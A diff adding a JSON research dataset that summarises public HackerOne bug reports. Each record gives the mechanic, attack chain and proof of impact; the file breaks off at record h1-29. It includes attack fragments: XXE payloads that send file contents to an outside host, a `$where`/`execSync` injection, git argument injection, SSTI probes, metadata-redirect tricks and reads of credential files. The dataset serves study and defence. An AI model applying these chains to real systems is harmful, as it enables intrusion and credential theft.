@@ -1,0 +1,3318 @@
+{
+ "meta": {
+  "source": "public disclosed HackerOne reports, public write-ups and research blogs (URLs per record)",
+  "licence": "public disclosure; facts and mechanics summarised, no report text copied",
+  "retrieved": "2026-11-02",
+  "notes": "built from corpus-2026-11/*.md research notes"
+ },
+ "reports": [
+  {
+   "id": "h1-01",
+   "source_url": "https://hackerone.com/reports/3782701",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "rce",
+    "graphql",
+    "auth-bypass"
+   ],
+   "first_signal": "GraphQL `filter` argument described as \"a free-form JSON object\"; not stated as a deliberate trigger",
+   "mechanic": "User-supplied `filter` JSON reaches `sift(filter)` unvalidated and sift compiles a string `$where` via `new Function` because `CSP_ENABLED` is unset.",
+   "chain": [
+    "Request with no `Authorization` header: `credentials.js` calls `next()`, request proceeds anonymous",
+    "Anonymous role holds `auth:expand-scopes`, so `scopes:[\"assume:anonymous\"]` makes upstream return a non-empty array so sift iterates",
+    "`{\"$where\":\"<js>\"}` executes per element",
+    "Error text returned to client via `formatError.js` becomes the output channel",
+    "`process.getBuiltinModule(\"child_process\").execSync()` for command execution"
+   ],
+   "impact_proof": "Marker `\"RCE_42_object\"` (6*7 + typeof process); `id` returning `uid=1000(node) gid=1000(node)`; `cat /etc/passwd`; env dump naming TASKCLUSTER_ACCESS_TOKEN, READ_DB_URL, DB_CRYPTO_KEYS, PULSE_PASSWORD, SESSION_SECRET=FIXME with values withheld and SHA-256 fingerprints offered; confirmed on firefox-ci-tc and community-tc.",
+   "keywords": [
+    "$where",
+    "sift",
+    "new function",
+    "free-form json filter",
+    "csp_enabled",
+    "formaterror error channel",
+    "anonymous scopes",
+    "execsync"
+   ],
+   "lesson": "filter-operator"
+  },
+  {
+   "id": "h1-02",
+   "source_url": "https://hackerone.com/reports/1679624",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$33,510",
+   "classes": [
+    "rce",
+    "deserialization"
+   ],
+   "first_signal": "Read GitLab's own patch for the previous bug: \"This is very similar to\" the 15.3.1 advisory, and the patch \"added validation to `Gitlab::Cache::Import::Caching` but there is another spot\" = `repository_importer.rb#L55`",
+   "mechanic": "An attacker-controlled `Sawyer::Resource` (`default_branch`) whose JSON keys override `to_s`/`bytesize` makes redis-rb emit a RESP frame with a wrong declared length, giving Redis command injection.",
+   "chain": [
+    "Authenticated user starts a GitHub import against the attacker's `github_hostname`",
+    "Fake API returns `default_branch` with mismatched `to_s`/`bytesize`",
+    "Value flows `change_head`->`branch_exists?`->`redis_set_cache.try_include?` and smuggles `set session:gitlab:<id>` holding a Marshal gadget",
+    "Request with `_gitlab_session=<id>` reaches `Marshal.load` and executes"
+   ],
+   "impact_proof": "strace of the Redis socket showing the injected `set session:gitlab:jjjj` with gadget `echo id > /tmp/vakzz22`; exception log `comparison of String with 0 failed` at `set_cache.rb:60`; PoC `fake_server3.py`, `gen_payload3.rb`. Command output itself not shown.",
+   "keywords": [
+    "resp protocol injection",
+    "sawyer::resource",
+    "to_s bytesize override",
+    "marshal.load gadget",
+    "_gitlab_session",
+    "incomplete patch second call site"
+   ],
+   "lesson": "patch-bypass"
+  },
+  {
+   "id": "h1-03",
+   "source_url": "https://hackerone.com/reports/1154542",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$20,000",
+   "classes": [
+    "rce",
+    "file-upload"
+   ],
+   "first_signal": "Workhorse source `exif.go#L104` passes any file with extension jpg|jpeg|tiff to ExifTool, plus the insight that \"ExifTool will ignore the file extension and try to determine what the file is based on the content\"",
+   "mechanic": "ExifTool DjVu annotation parsing runs tokens through Perl `eval`, and its escaping check misses backslash followed by newline.",
+   "chain": [
+    "Upload a DjVu file renamed `.jpg` through the snippet \"Attach a file\" feature",
+    "ExifTool content-sniffs the file to the DjVu module",
+    "Copyright annotation closes the string with backslash plus newline and appends `qx{...}`",
+    "Shell as the `git` user"
+   ],
+   "impact_proof": "Local `echo_vakzz.jpg` creating `/tmp/vakzz`; on production `https://gitlab.com/-/snippets/new` a reverse shell with `id` -> `uid=500(git)`, `hostname -a` -> `web-09-sv-gprd`, `ps auxww` showing `TCPSocket.new(\"103.3.61.137\",12345)`.",
+   "keywords": [
+    "content sniffing vs extension allowlist",
+    "djvu annotation",
+    "perl eval",
+    "qx{}",
+    "backslash newline escape gap",
+    "exiftool -all= after parse"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "h1-04",
+   "source_url": "https://hackerone.com/reports/658013",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "rce",
+    "other"
+   ],
+   "first_signal": "Search API `wiki_blobs` scope \"can be provided with an arbitrary `ref` parameter\"; how he reached that observation is not stated",
+   "mechanic": "`ref` reaches the `git log` argv unsanitized, so `--`-prefixed values parse as git options (argument injection).",
+   "chain": [
+    "Wiki commit message holds attacker content (an SSH public key)",
+    "`search?scope=wiki_blobs&search=page&ref=--output=/tmp/file` gives arbitrary file write as `git`",
+    "Target `/var/opt/gitlab/.ssh/authorized_keys` and log in over SSH"
+   ],
+   "impact_proof": "`cat /tmp/file` showing controlled content; `ssh git@gitlab-vm.local -i gitlab` then `id` -> `uid=998(git)`; overwritten authorized_keys shown with the injected `ssh-rsa` line.",
+   "keywords": [
+    "argument injection",
+    "--output",
+    "git log argv",
+    "end-of-options separator",
+    "authorized_keys write",
+    "wiki_blobs ref"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-05",
+   "source_url": "https://hackerone.com/reports/125980",
+   "set": "hackerone",
+   "severity": "unknown",
+   "bounty": "$10,000",
+   "classes": [
+    "ssti"
+   ],
+   "first_signal": "Set the profile name to `{{ '7'*7 }}`; the notification email \"Your Uber account information has been updated\" from support@uber.com rendered `7777777`",
+   "mechanic": "The profile name is evaluated as Jinja2 when the notification email template is built (inferred from output; no code shown).",
+   "chain": [
+    "Profile name field accepts template syntax",
+    "Template evaluation happens while building the outbound mail",
+    "`{{ [].__class__.__base__.__subclasses__() }}` and `{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}` enumerate classes",
+    "Full RCE claimed but not achieved because of a length limit"
+   ],
+   "impact_proof": "Email screenshots and class-enumeration output. No command execution.",
+   "keywords": [
+    "{{ '7'*7 }}",
+    "jinja2",
+    "notification email render sink",
+    "__subclasses__",
+    "out-of-band render channel",
+    "length limit"
+   ],
+   "lesson": "server-side-fetcher"
+  },
+  {
+   "id": "h1-06",
+   "source_url": "https://hackerone.com/reports/925585",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$30,000",
+   "classes": [
+    "rce",
+    "other"
+   ],
+   "first_signal": null,
+   "mechanic": "Internal npm package names resolved against the public registry; the names were unclaimed, so anyone could publish them.",
+   "chain": [
+    "Publish the internal package names on the public registry",
+    "Internal builds install them",
+    "Code execution in the development environment"
+   ],
+   "impact_proof": "PayPal: researcher \"observed they were downloaded\". No payload or callback detail; report body redacted (empty).",
+   "keywords": [
+    "dependency confusion",
+    "unclaimed internal package name",
+    "public registry resolution",
+    "supply chain",
+    "build-time install"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-07",
+   "source_url": "https://hackerone.com/reports/341876",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": "$25,000",
+   "classes": [
+    "ssrf",
+    "info-leak"
+   ],
+   "first_signal": "The Exchange app's screenshot feature - a server-side renderer he could point at a URL",
+   "mechanic": "SSRF to the GCE metadata service through a server-side screenshot renderer, with metadata concealment not enabled.",
+   "chain": [
+    "Edit own store's `password.liquid` to send the browser to the metadata service",
+    "Install Exchange; its screenshot captures the metadata response as an image; the older `/v1beta1` endpoint does not require the `Metadata-Flavor: Google` header and `alt=json` renders more",
+    "Leaked service-account token is useless for SSH (403, no Compute permissions)",
+    "Dump `kube-env` for the Kubelet CA cert, client cert and key",
+    "Kubelet credentials can list/create pods but not exec and `get secrets` is denied; describing a pod reveals a secret's name, so fetch that secret for a service-account token",
+    "`kubectl exec` gives `id` = `uid=0(root)`"
+   ],
+   "impact_proof": "Root `id` output inside containers.",
+   "keywords": [
+    "screenshot renderer ssrf",
+    "gce metadata /v1beta1",
+    "metadata-flavor header not required",
+    "kube-env",
+    "kubelet certificate",
+    "pod description leaks secret name",
+    "metadata concealment off"
+   ],
+   "lesson": "server-side-fetcher"
+  },
+  {
+   "id": "h1-08",
+   "source_url": "https://hackerone.com/reports/2262382",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$25,000",
+   "classes": [
+    "ssrf",
+    "xss"
+   ],
+   "first_signal": "PoC redacted; the only observable is the fallback error string `\"Missing template for element: #{element[:template]}\"`, and the report does not say it was the trigger",
+   "mechanic": "Attacker-controlled `element[:template]` is reflected unescaped into the error branch HTML, which is then fed to a server-side PDF renderer.",
+   "chain": [
+    "Request a PDF analytics report with element type `'template'`",
+    "`template_path(element)` misses and the raw value lands in `html_without_layout`, giving HTML injection; the injected tag was an `<iframe>`",
+    "The renderer fetches it server-side: SSRF into internal AWS and temporary credentials"
+   ],
+   "impact_proof": "Researcher was \"able to access AWS Credentials\"; team confirms internal AWS plus temporary credentials and praised \"stopping at the right point in testing\". Artifacts redacted.",
+   "keywords": [
+    "lookup-failure branch",
+    "render_to_string",
+    "html injection into pdf renderer",
+    "iframe ssrf",
+    "aws temporary credentials",
+    "allowlist skipped on error path"
+   ],
+   "lesson": "server-side-fetcher"
+  },
+  {
+   "id": "h1-09",
+   "source_url": "https://hackerone.com/reports/2301565",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": "$2,500",
+   "classes": [
+    "ssrf"
+   ],
+   "first_signal": "\"I noticed that there is no filter enabled for IPV6 IP addresses with IPv6 address mapped to IPv4.\"",
+   "mechanic": "Webhook fetcher follows a redirect to an IPv4-mapped IPv6 metadata address that the anti-SSRF rules do not normalize.",
+   "chain": [
+    "Set an organisation webhook URL to an attacker PHP page",
+    "The page returns `header(\"Location: http://[::ffff:a9fe:a9fe]\")`",
+    "\"Test request\" makes the server follow it and the response is visible in the webhook logs"
+   ],
+   "impact_proof": "Webhook log shows header `server: EC2ws`. No metadata contents were read, so it stayed Medium - the same class as the $25,000 cases at 10x-100x less bounty.",
+   "keywords": [
+    "ipv4-mapped ipv6",
+    "[::ffff:a9fe:a9fe]",
+    "webhook test request",
+    "redirect to metadata",
+    "webhook log as output channel",
+    "encoding normalization gap"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "h1-10",
+   "source_url": "https://hackerone.com/reports/826361",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$10,000",
+   "classes": [
+    "ssrf"
+   ],
+   "first_signal": "Source line in the Note model, `mount_uploader :attachment, AttachmentUploader`, plus library knowledge that CarrierWave's mount auto-creates a `remote_attachment_url=` setter",
+   "mechanic": "The project-import AttributeCleaner did not strip CarrierWave's `remote_*_url` setters, so import reaches `Kernel.open(@uri)` for a server-side GET.",
+   "chain": [
+    "Craft a `project.json` note hash carrying `remote_attachment_url`",
+    "Import it; `uploader.download!` fetches the arbitrary URL",
+    "The response is saved as the note attachment, giving full-read SSRF viewable in your own project"
+   ],
+   "impact_proof": "Live import on gitlab.com fetching postbin, note link `gitlab.com/wbowling/ssrf1/-/issues/1#note_309127303`, screenshot plus `ssrf-note.mp4`. Metadata and Redis-RCE escalation described only.",
+   "keywords": [
+    "mount_uploader",
+    "remote_attachment_url=",
+    "carrierwave download!",
+    "attributecleaner allowlist",
+    "project.json import",
+    "response stored as attachment"
+   ],
+   "lesson": "framework-internals"
+  },
+  {
+   "id": "h1-11",
+   "source_url": "https://hackerone.com/reports/549882",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "ssrf"
+   ],
+   "first_signal": null,
+   "mechanic": "\"Using our upload feature, the user was able to force an SSRF\"; mechanic and steps not stated (body redacted).",
+   "chain": [
+    "Upload feature fetches a user-supplied resource server-side",
+    "Internal GCP data including SSH keys reachable per the report title"
+   ],
+   "impact_proof": "Title claims internal GCP data including SSH keys; no steps or artifacts stated. External write-up cited (medium.com/@dPhoeniixx).",
+   "keywords": [
+    "upload fetcher ssrf",
+    "internal gcp metadata",
+    "ssh keys",
+    "body redacted"
+   ],
+   "lesson": "server-side-fetcher"
+  },
+  {
+   "id": "h1-12",
+   "source_url": "https://hackerone.com/reports/312543",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "xxe"
+   ],
+   "first_signal": "Site Audit option \"Enter sitemap URL\" - a user-supplied URL \"downloaded and processed by a Java XML processor\"; confirmed by an inbound hit in his own log: `\"GET /text.txt HTTP/1.1\" 302 - \"-\" \"Java/1.8.0_144\"` with crawler UA `SemrushBot-SA/0.97`",
+   "mechanic": "External DTD/entity processing left on in the sitemap XML parser, with exfiltration carried by the crawler's own outbound fetch.",
+   "chain": [
+    "Attacker-hosted XML is parsed by the site-audit crawler",
+    "OOB entity `<!ENTITY xxe SYSTEM \"http://xxe.webhooks.pw/text.txt\">` proves external entities resolve",
+    "Parameter entity `<!ENTITY % goodies SYSTEM \"file:///etc/hostname\">` plus an external `combine.dtd` defining `<!ENTITY xxe \"%goodies;\">`",
+    "The value is placed in `<loc>http://location.webhooks.pw/resp/&xxe;</loc>` and the crawler requests that loc, exfiltrating over its own fetch"
+   ],
+   "impact_proof": "Attacker-server logs from `46.229.173.66` with `GET /resp/<redacted>` plus a \"Decoded:\" section; `/etc/hostname` captured; `file:///home/` directory listing (`cdh`, `lost found`); 1-minute GIF `semrush_xxe3.gif`.",
+   "keywords": [
+    "sitemap url parser",
+    "java/1.8 user-agent in own log",
+    "parameter entity",
+    "external dtd combine.dtd",
+    "<loc> exfil via crawler fetch",
+    "file:///etc/hostname"
+   ],
+   "lesson": "server-side-fetcher"
+  },
+  {
+   "id": "h1-13",
+   "source_url": "https://hackerone.com/reports/1439593",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$29,000",
+   "classes": [
+    "lfi",
+    "file-upload"
+   ],
+   "first_signal": "Source `lib/bulk_imports/common/pipelines/uploads_pipeline.rb`, the line `untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)` followed by `Dir.glob(...'**','*')`, plus an implicit differential against the other import path: \"Symlinks should be removed similar to the project import\"",
+   "mechanic": "The bulk-import uploads pipeline untars an attacker archive without stripping symlinks, then opens and stores the file the symlink points at.",
+   "chain": [
+    "Importable group pointed at an attacker-controlled source URL (Flask proxy plus ngrok) swapping in `uploads.tar.gz` containing `ln -s /etc/passwd ./<upload-secret>/passwd`",
+    "The symlink sits in a directory named with a real 32-hex upload secret lifted from his own milestone attachment, so it passes `extract_dynamic_path`",
+    "`load` does `File.open(file_path,'r')`, follows the symlink, and `UploadService` stores the content as a group upload, readable at `/-/uploads/<secret>/passwd`"
+   ],
+   "impact_proof": "On gitlab.com, `/etc/passwd` containing `git:x:1000:1000:GitLab,,,:/home/git:/bin/bash`, then `/srv/gitlab/config/secrets.yml` yielding `secret_key_base`, `otp_key_base`, `db_key_base`, `openid_connect_signing_key`, `ci_jwt_signing_key`.",
+   "keywords": [
+    "untar_zxf",
+    "symlink in tar",
+    "extract_dynamic_path",
+    "32-hex upload secret reuse",
+    "secrets.yml secret_key_base",
+    "differential between two import pipelines"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "h1-14",
+   "source_url": "https://hackerone.com/reports/827052",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$20,000",
+   "classes": [
+    "lfi"
+   ],
+   "first_signal": "The reference regex and specifically its permissive group - `MARKDOWN_PATTERN = %r{\\!?\\[.*?\\]\\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\\)}` - \"there is no restriction on what `file` can be\"",
+   "mechanic": "The markdown upload-reference regex pins the secret to 32 hex but leaves the filename as `.*?`, so a traversal path survives into the upload rewriter's file copy.",
+   "chain": [
+    "Issue description containing `![a](/uploads/1111...1111/../../../../../etc/passwd)`",
+    "Move the issue: `UploadsRewriter`->`find_file`->`retrieve_from_store!(file)`",
+    "`file.try(:exists?)` passes and `copy_to(file, target_parent)` copies the server file into the target project, where it can be read"
+   ],
+   "impact_proof": "`/etc/passwd` copied into the second project; video `file-read.mp4`.",
+   "keywords": [
+    "permissive regex quantifier",
+    "(?<file>.*?)",
+    "uploadsrewriter",
+    "retrieve_from_store!",
+    "move issue as trigger",
+    "existence check confirms target"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-15",
+   "source_url": "https://hackerone.com/reports/2293343",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$35,000",
+   "classes": [
+    "auth-bypass"
+   ],
+   "first_signal": "Not stated; the only observable is `\"user[email]\":\"victim@gmail.com\"` in the intercepted reset POST",
+   "mechanic": "The password-reset handler accepted an array where it expected a scalar and mailed the reset link to every address in it.",
+   "chain": [
+    "\"Forgot Your Password?\" with the victim email",
+    "Burp \"Content-Type Converter -> Convert to JSON\"",
+    "`\"user\":{\"email\":[\"victim@gmail.com\",\"attacker@gmail.com\"]}` sends the same reset link to both",
+    "Set the password and log in as the victim"
+   ],
+   "impact_proof": "Reset mail received at the attacker address, password changed, logged in as the victim. No attachments.",
+   "keywords": [
+    "content-type converter to json",
+    "param to array",
+    "scalar type not enforced",
+    "password reset link to both addresses",
+    "two-mutation move"
+   ],
+   "lesson": "client-supplied-field"
+  },
+  {
+   "id": "h1-16",
+   "source_url": "https://hackerone.com/reports/976603",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$10,500",
+   "classes": [
+    "saml",
+    "auth-bypass"
+   ],
+   "first_signal": "The observation that you can \"authenticate against one SSO instance, but have you get added to a completely separate one\"; the concrete trigger was a new org whose `entityId` is the victim's \"except with a space ` ` at the end\"",
+   "mechanic": "SAML signature is verified against `trim(issuer)` while org assignment uses the untrimmed `entityId`, and the trailing-space entity is always prioritized.",
+   "chain": [
+    "Register an org with the victim `entityId` plus a trailing space and your own keypair",
+    "After about 2 minutes of propagation the victim's users authenticate but route to the attacker org, causing SSO denial of service",
+    "New or re-added users get provisioned into the attacker org even though the assertion was signed by the victim IdP key; existing accounts must click \"join\"",
+    "Attacker changes the `entityId` and logs in as the victim with their own keypair; converted personal accounts expose personal documents"
+   ],
+   "impact_proof": "Repro steps only, no attachments; full zero-interaction ATO not shown (\"I'm not sure if it's possible to get this with zero user interaction\").",
+   "keywords": [
+    "entityid trailing space",
+    "trim(issuer) signature check",
+    "untrimmed org assignment",
+    "idp propagation delay",
+    "sso denial of service",
+    "identity confusion"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "h1-17",
+   "source_url": "https://hackerone.com/reports/922456",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$3,000",
+   "classes": [
+    "oauth",
+    "auth-bypass"
+   ],
+   "first_signal": "The interstitial text itself - \"Verify the email address in your account profile before you sign in.\" He then replayed the underlying form POST.",
+   "mechanic": "Email verification was enforced only on the OAuth consent page, not in the `/oauth/authorize` POST handler, so an unconfirmed account still gets a code.",
+   "chain": [
+    "Seed the victim on laravelshift.com via GitHub/Bitbucket with email X",
+    "Register an unconfirmed GitLab account with email X",
+    "\"Sign in with GitLab\" is blocked at the consent page",
+    "POST `/oauth/authorize` directly with cookies, `authenticity_token`, `client_id`, `redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback`, `state`, `response_type=code` and get a 302 with `code`",
+    "The relying party merges accounts by email, giving ATO on the third party"
+   ],
+   "impact_proof": "Account takeover on a victim account he seeded on a real relying party.",
+   "keywords": [
+    "ui-only gate",
+    "replay the gated post",
+    "/oauth/authorize",
+    "unverified email",
+    "rp merges by email",
+    "authenticity_token"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "h1-18",
+   "source_url": "https://hackerone.com/reports/202781",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "oauth",
+    "open-redirect"
+   ],
+   "first_signal": null,
+   "mechanic": "The Facebook OAuth app allowed any `https://auth.uber.com/login?*` as `redirect_uri`, and Uber's own endpoints then forwarded the token outward.",
+   "chain": [
+    "The wildcard allows appending `next_url`",
+    "`next_url=https://login.uber.com/logout`, which \"would redirect based on the Referer header\"",
+    "The Referer-based redirect delivers the victim plus the Facebook token to the attacker site"
+   ],
+   "impact_proof": "Team says it \"would have allowed for a full account takeover\"; actual takeover not stated. Single-URL PoC.",
+   "keywords": [
+    "redirect_uri wildcard ?*",
+    "next_url",
+    "referer-based redirect",
+    "own redirector as gadget",
+    "token exfil hop"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-19",
+   "source_url": "https://hackerone.com/reports/861940",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": null,
+   "classes": [
+    "oauth",
+    "open-redirect"
+   ],
+   "first_signal": "The `redirect_uri` on `oauth.semrush.com` with `client_id=seoquake`, tested with accented hosts",
+   "mechanic": "Server-side validation maps homoglyph hosts onto `semrush.com` while the browser resolves the punycode host instead, so the code is delivered to an attacker domain.",
+   "chain": [
+    "Submit `redirect_uri` with a homoglyph host (`sémrush.com`, `šemrush.com`, `sèmrûsh.com`)",
+    "Validation accepts it as `semrush.com`",
+    "Browser resolves `oauth.xn--emrush-9jb.com` and the code is sent there"
+   ],
+   "impact_proof": "PoC URL; code \"will be sent to oauth.šemrush.com\"; evidence redacted; the code was never exchanged, so the rating stayed Medium.",
+   "keywords": [
+    "idn homoglyph",
+    "punycode xn--",
+    "validation not idempotent",
+    "redirect_uri host normalization",
+    "code never exchanged"
+   ],
+   "lesson": "parser-differential"
+  },
+  {
+   "id": "h1-20",
+   "source_url": "https://hackerone.com/reports/534450",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "xss",
+    "auth-bypass",
+    "sibling-interface"
+   ],
+   "first_signal": "His own previously rejected report #532553 - \"An endpoint at gnar.grammarly.com called \\\"/cookies\\\" allows us to set or get any cookie value we want\", rejected with \"this is how cookies are supposed to work\". He kept going and found the cookie gets reflected on www.grammarly.com in the src attribute of an img tag, and that the exploitable copy was the one surrounded with noscript tags.",
+   "mechanic": "A sibling host's /cookies endpoint sets and reads arbitrary cookies; the planted cookie is reflected unencoded inside a `<noscript>` img tag on the main origin, so XSS there can read the session cookie back through /cookies.",
+   "chain": [
+    "Cross-origin credentialed POST to `gnar.grammarly.com/cookies?name=gnar_containerId&value=<payload closing </noscript> plus external script>`",
+    "Victim is redirected to `www.grammarly.com/upgrade?...` where the value reflects unencoded, giving XSS in the grammarly.com origin",
+    "From that origin, GET `gnar.grammarly.com/cookies?name=grauth`, read the response and exfiltrate it for session theft"
+   ],
+   "impact_proof": "Stole the `grauth` cookie of a test account; webserver logs `\"GET /?cookie={<redacted>}\"` with referrer `https://www.grammarly.com/`; `Grammarly_Takeover_POC.mp4`; tested on Chrome 73 and Firefox 60.6.1esr.",
+   "keywords": [
+    "cookie injection endpoint",
+    "noscript reflection copy",
+    "httponly bypassed by cookie read endpoint",
+    "two-host chain",
+    "own rejected report reopened",
+    "grauth exfil"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-21",
+   "source_url": "https://hackerone.com/reports/745324",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$20,000",
+   "classes": [
+    "secret-exposure",
+    "auth-bypass"
+   ],
+   "first_signal": "A HackerOne analyst pasted a live session cookie into a reply on his earlier report - \"you are gevi me your session on last report\"; H1: \"parts of a cURL command, copied from a browser console, were not removed\"",
+   "mechanic": "A live session cookie disclosed in a report comment could be replayed from another client because sessions were not bound to IP or device.",
+   "chain": [
+    "Credential disclosure in a comment",
+    "Reuse the cookie in another client, with no IP or device binding",
+    "Security Analyst access: HAS Inbox, Triage Inbox, Inbox and Report View across that analyst's programs"
+   ],
+   "impact_proof": "Claim \"i can read all reports @security and more program\"; evidence redacted; H1's own investigation confirmed three features used to view titles, metadata and some full contents, with GraphQL queries traced.",
+   "keywords": [
+    "session cookie in a comment",
+    "curl command copied from console",
+    "no ip or device binding",
+    "session replay",
+    "analyst inbox access"
+   ],
+   "lesson": "secret-validation"
+  },
+  {
+   "id": "h1-22",
+   "source_url": "https://hackerone.com/reports/173551",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$10,000",
+   "classes": [
+    "auth-bypass",
+    "info-leak"
+   ],
+   "first_signal": null,
+   "mechanic": "The password-reset token was returned in the HTTP response of the reset request.",
+   "chain": [
+    "Know the victim email",
+    "Start the password reset",
+    "Read the token from the response",
+    "Complete the reset"
+   ],
+   "impact_proof": "Not stated; report body redacted.",
+   "keywords": [
+    "reset token in response body",
+    "read the response of the reset request",
+    "token-in-response",
+    "account takeover"
+   ],
+   "lesson": "body-not-status"
+  },
+  {
+   "id": "h1-23",
+   "source_url": "https://hackerone.com/reports/739737",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$15,300",
+   "classes": [
+    "info-leak",
+    "auth-bypass"
+   ],
+   "first_signal": null,
+   "mechanic": "Security-challenge tokens leaked in a JS file used by the reCAPTCHA implementation (XSSI), and the challenge endpoint did not prevent third-party token reuse.",
+   "chain": [
+    "Victim on the attacker site; XSSI reads the challenge token",
+    "Victim clicks a login link and authenticates; CAPTCHA is required after auth",
+    "Attacker POSTs the CAPTCHA solve with the stolen token, triggering the authentication-request replay, which returns the victim's email and plaintext password"
+   ],
+   "impact_proof": "Not stated (body empty, team summary only). Fix was controls against token reuse.",
+   "keywords": [
+    "xssi js file token",
+    "recaptcha implementation",
+    "authentication request replay",
+    "third-party token reuse",
+    "plaintext password returned"
+   ],
+   "lesson": "composition"
+  },
+  {
+   "id": "h1-24",
+   "source_url": "https://hackerone.com/reports/2443228",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$12,000",
+   "classes": [
+    "auth-bypass"
+   ],
+   "first_signal": null,
+   "mechanic": "Account-recovery endpoint with \"improper parameter handling\" / \"improper authentication mechanism\" allowing takeover by knowing the account username; mechanic not extractable.",
+   "chain": [
+    "Know the target account username",
+    "Abuse the account-recovery endpoint's parameter handling (endpoint and parameter not stated)"
+   ],
+   "impact_proof": "Not stated; report content redacted (`no-content`). Affected Android, scope `*.tiktokv.com`.",
+   "keywords": [
+    "account recovery endpoint",
+    "improper parameter handling",
+    "username-only precondition",
+    "redacted no-content"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-25",
+   "source_url": "https://hackerone.com/reports/1328546",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$15,000",
+   "classes": [
+    "auth-bypass",
+    "xss"
+   ],
+   "first_signal": null,
+   "mechanic": "\"JWT (JSON Web Token) was not verified properly\" on an \"intelbot service\"; how the pieces connect is not stated.",
+   "chain": [
+    "JWT accepted without proper verification on the intelbot service",
+    "Summary also mentions authentication bypass and site-wide stored XSS, connection not stated"
+   ],
+   "impact_proof": "Not stated; report redacted.",
+   "keywords": [
+    "jwt not verified",
+    "intelbot service",
+    "site wide stored xss",
+    "redacted"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-26",
+   "source_url": "https://hackerone.com/reports/1901040",
+   "set": "hackerone",
+   "severity": "high",
+   "bounty": "$10,000",
+   "classes": [
+    "auth-bypass",
+    "missing_authorization"
+   ],
+   "first_signal": null,
+   "mechanic": "\"A missed check in the gist.github.com authentication flow\" - the gist SSH path trusted a CA-signed certificate's claimed login.",
+   "chain": [
+    "Issue a certificate via the SSH CA feature",
+    "Set the extension `login@github.com=<victim username>`",
+    "gist.github.com authenticates as the victim, allowing pushes to any user's gists (vendor: needed to know the secret gist URL)"
+   ],
+   "impact_proof": "Not stated; body `no-content`. The specific missing check is not stated.",
+   "keywords": [
+    "ssh ca certificate",
+    "login@github.com extension",
+    "one surface missed check",
+    "gist authentication flow",
+    "cve-2023-23761"
+   ],
+   "lesson": "sibling-interface"
+  },
+  {
+   "id": "h1-27",
+   "source_url": "https://hackerone.com/reports/3713965",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": null,
+   "classes": [
+    "oauth"
+   ],
+   "first_signal": null,
+   "mechanic": "The OAuth consent screen omitted the `manage_runners:org` scope - \"A UI misrepresentation vulnerability\".",
+   "chain": [
+    "App requests `manage_runners:org`",
+    "Victim authorizes without that scope being displayed",
+    "App gains access to org runner management"
+   ],
+   "impact_proof": "Not stated; body empty. Included as a Medium data point: a scope/consent defect with no demonstrated takeover stays Medium.",
+   "keywords": [
+    "consent screen scope omission",
+    "manage_runners:org",
+    "ui misrepresentation",
+    "cve-2026-9106"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-28",
+   "source_url": "https://hackerone.com/reports/740989",
+   "set": "hackerone",
+   "severity": "medium",
+   "bounty": null,
+   "classes": [
+    "oauth",
+    "missing_authorization"
+   ],
+   "first_signal": "Pure flow observation: he \"noticed that a staff member without Apps permission was able to access the Stocky app\"",
+   "mechanic": "Stocky granted access at the start of the OAuth process rather than at the end, which Shopify called \"a full authentication bypass\".",
+   "chain": [
+    "Staff member without the Apps permission starts the OAuth process",
+    "Access is granted at the start of the flow rather than after completion"
+   ],
+   "impact_proof": "Only that the unprivileged staff member got in - no data shown, hence Medium despite the words \"full authentication bypass\".",
+   "keywords": [
+    "access granted at start of oauth",
+    "staff without apps permission",
+    "flow observation with no payload",
+    "label vs proven impact"
+   ],
+   "lesson": "other"
+  },
+  {
+   "id": "h1-29",
+   "source_url": "https://hackerone.com/reports/3862641",
+   "set": "hackerone",
+   "severity": "critical",
+   "bounty": "$15,000",
+   "classes": [
+    "idor",
+    "info-leak"
+   ],
+   "first_signal": "Hunter's body blank; the team summary's observable is a 422 \"You do not have the appropriate access\" that still carried data in `context.subject`",
